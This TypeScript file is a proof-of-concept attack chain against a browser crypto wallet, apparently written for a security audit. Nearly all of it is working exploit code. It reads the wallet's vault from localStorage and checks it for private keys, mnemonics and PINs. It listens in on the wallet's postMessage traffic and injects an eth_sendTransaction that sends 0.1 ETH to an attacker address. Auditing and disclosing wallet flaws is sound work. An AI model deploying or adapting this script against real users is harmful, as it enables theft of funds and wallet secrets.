/**
 * PoC #5: Combined Attack Chain
 * 
 * This PoC demonstrates a realistic attack scenario combining multiple
 * vulnerabilities to compromise a Verified Wallet user.
 * 
 * Attack Flow:
 * 1. Malicious page loads and intercepts wallet communications
 * 2. Steals vault data from localStorage
 * 3. Monitors for transaction signing requests
 * 4. Attempts to inject malicious transaction
 * 
 * This is designed to be run as a single script that performs the full attack.
 */

interface AttackResults {
  localStorage: {
    success: boolean;
    data?: any;
    addresses?: string[];
  };
  messageInterception: {
    requestsIntercepted: number;
    responsesIntercepted: number;
    sensitiveDataLeaked: string[];
  };
  transactionInjection: {
    attempted: boolean;
    succeeded: boolean;
    error?: string;
  };
}

class VerifiedWalletAttack {
  private results: AttackResults = {
    localStorage: { success: false },
    messageInterception: {
      requestsIntercepted: 0,
      responsesIntercepted: 0,
      sensitiveDataLeaked: []
    },
    transactionInjection: {
      attempted: false,
      succeeded: false
    }
  };
  
  private attackerAddress = "0x0000000000000000000000000000000000000001"; // Placeholder

  constructor(attackerAddress?: string) {
    if (attackerAddress) {
      this.attackerAddress = attackerAddress;
    }
    console.log("🎯 Verified Wallet Attack Chain Initialized");
    console.log(`   Attacker address: ${this.attackerAddress}`);
  }

  /**
   * Phase 1: Steal vault data from localStorage
   */
  phaseOne_StealVaultData(): void {
    console.log("\n📍 PHASE 1: Stealing vault data from localStorage...\n");
    
    try {
      const vaultData = localStorage.getItem("myVault");
      
      if (vaultData) {
        const parsed = JSON.parse(vaultData);
        this.results.localStorage = {
          success: true,
          data: parsed,
          addresses: [parsed.address, parsed.regAddress].filter(Boolean)
        };
        
        console.log("✅ Vault data stolen!");
        console.log("   Addresses found:", this.results.localStorage.addresses);
        console.log("   Chain ID:", parsed.chainId);
        
        // Check for high-value data
        const sensitiveKeys = ["privateKey", "pk", "mnemonic", "seed", "pin"];
        for (const key of sensitiveKeys) {
          if (parsed[key]) {
            console.log(`   ⚠️  CRITICAL: ${key} found in vault!`);
            this.results.messageInterception.sensitiveDataLeaked.push(key);
          }
        }
      } else {
        console.log("⚠️  No vault data in localStorage (user not connected)");
        this.results.localStorage.success = false;
      }
    } catch (e) {
      console.log("❌ Failed to parse vault data:", e);
    }
  }

  /**
   * Phase 2: Set up message interception
   */
  phaseTwo_SetupInterception(): void {
    console.log("\n📍 PHASE 2: Setting up message interception...\n");
    
    window.addEventListener("message", (event: MessageEvent) => {
      if (event.source !== window || !event.data) return;
      
      if (event.data.type === "VW_REQ") {
        this.results.messageInterception.requestsIntercepted++;
        console.log(`📨 Request #${this.results.messageInterception.requestsIntercepted}:`, 
          event.data.params?.method);
        
        // Log sensitive methods
        if (["eth_sendTransaction", "eth_sign", "personal_sign"].includes(event.data.params?.method)) {
          console.log("   ⚠️  SENSITIVE: Transaction/signing detected!");
          console.log("   Params:", JSON.stringify(event.data.params, null, 2));
        }
      }
      
      if (event.data.type === "VW_RES") {
        this.results.messageInterception.responsesIntercepted++;
        
        // Check for leaked data in responses
        if (event.data.params?.data) {
          const dataStr = JSON.stringify(event.data.params.data);
          if (dataStr.includes("address") || dataStr.includes("0x")) {
            console.log("📩 Response with addresses:", event.data.params.data);
          }
          if (event.data.params.saveToStorage) {
            console.log("⚠️  Response saving to storage - capturing data!");
            this.results.messageInterception.sensitiveDataLeaked.push("vault_update");
          }
        }
      }
    });
    
    console.log("✅ Message interceptor active");
  }

  /**
   * Phase 3: Wait for opportunity and inject malicious transaction
   */
  async phaseThree_InjectTransaction(): Promise<void> {
    console.log("\n📍 PHASE 3: Attempting transaction injection...\n");
    
    // First check if we have a valid address to attack
    if (!this.results.localStorage.success || !this.results.localStorage.addresses?.length) {
      console.log("⚠️  No target address found. Need to wait for user to connect.");
      
      return new Promise((resolve) => {
        // Wait for wallet connection
        const checkInterval = setInterval(() => {
          const vaultData = localStorage.getItem("myVault");
          if (vaultData) {
            try {
              const parsed = JSON.parse(vaultData);
              if (parsed.address) {
                console.log("✅ Target address acquired:", parsed.address);
                clearInterval(checkInterval);
                this.attemptTransactionInjection();
                resolve();
              }
            } catch {}
          }
        }, 1000);
        
        // Timeout after 30 seconds
        setTimeout(() => {
          clearInterval(checkInterval);
          console.log("⏱️  Timeout waiting for wallet connection");
          resolve();
        }, 30000);
      });
    }
    
    await this.attemptTransactionInjection();
  }

  private async attemptTransactionInjection(): Promise<void> {
    console.log("🎯 Injecting malicious transaction request...");
    
    const messageId = Math.random().toString(36).substring(2);
    this.results.transactionInjection.attempted = true;
    
    return new Promise((resolve) => {
      const handler = (event: MessageEvent) => {
        if (event.source !== window) return;
        if (event.data?.type !== "VW_RES") return;
        if (event.data?.id !== messageId) return;
        
        window.removeEventListener("message", handler);
        
        if (event.data.params?.success) {
          console.log("💀 CRITICAL: Transaction injection SUCCEEDED!");
          console.log("   TX Hash:", event.data.params.data);
          this.results.transactionInjection.succeeded = true;
        } else {
          console.log("✅ Transaction injection blocked:", event.data.params?.error);
          this.results.transactionInjection.error = event.data.params?.error;
        }
        resolve();
      };
      
      window.addEventListener("message", handler);
      
      // Inject transaction request
      window.postMessage({
        type: "VW_REQ",
        id: messageId,
        params: {
          method: "eth_sendTransaction",
          params: [{
            to: this.attackerAddress,
            value: "0x16345785D8A0000", // 0.1 ETH
            data: "0x"
          }]
        }
      }, "*");
      
      // Timeout
      setTimeout(() => {
        window.removeEventListener("message", handler);
        console.log("⏱️  No response to injected transaction");
        resolve();
      }, 60000);
    });
  }

  /**
   * Print attack summary
   */
  printReport(): void {
    console.log("\n" + "=".repeat(60));
    console.log("ATTACK CHAIN REPORT");
    console.log("=".repeat(60));
    
    console.log("\n📊 PHASE 1 - localStorage Theft:");
    console.log(`   Success: ${this.results.localStorage.success}`);
    if (this.results.localStorage.addresses) {
      console.log(`   Addresses stolen: ${this.results.localStorage.addresses.length}`);
    }
    
    console.log("\n📊 PHASE 2 - Message Interception:");
    console.log(`   Requests intercepted: ${this.results.messageInterception.requestsIntercepted}`);
    console.log(`   Responses intercepted: ${this.results.messageInterception.responsesIntercepted}`);
    console.log(`   Sensitive data types: ${this.results.messageInterception.sensitiveDataLeaked.join(", ") || "None"}`);
    
    console.log("\n📊 PHASE 3 - Transaction Injection:");
    console.log(`   Attempted: ${this.results.transactionInjection.attempted}`);
    console.log(`   Succeeded: ${this.results.transactionInjection.succeeded}`);
    if (this.results.transactionInjection.error) {
      console.log(`   Blocked by: ${this.results.transactionInjection.error}`);
    }
    
    console.log("\n" + "=".repeat(60));
    
    // Calculate severity
    let severity = "LOW";
    if (this.results.transactionInjection.succeeded) {
      severity = "CRITICAL";
    } else if (this.results.localStorage.success && 
               this.results.messageInterception.sensitiveDataLeaked.length > 0) {
      severity = "HIGH";
    } else if (this.results.localStorage.success) {
      severity = "MEDIUM";
    }
    
    console.log(`OVERALL SEVERITY: ${severity}`);
    console.log("=".repeat(60) + "\n");
  }

  /**
   * Run the full attack chain
   */
  async execute(): Promise<AttackResults> {
    console.log("\n🚀 EXECUTING ATTACK CHAIN...\n");
    
    this.phaseOne_StealVaultData();
    this.phaseTwo_SetupInterception();
    
    // Phase 3 requires user interaction (popup) so we set it up but don't block
    // Uncomment to test:
    // await this.phaseThree_InjectTransaction();
    
    this.printReport();
    return this.results;
  }
}

// Self-executing attack (for browser console)
const attack = new VerifiedWalletAttack();
attack.execute().then(results => {
  console.log("Attack completed. Results object:", results);
});

export { VerifiedWalletAttack };
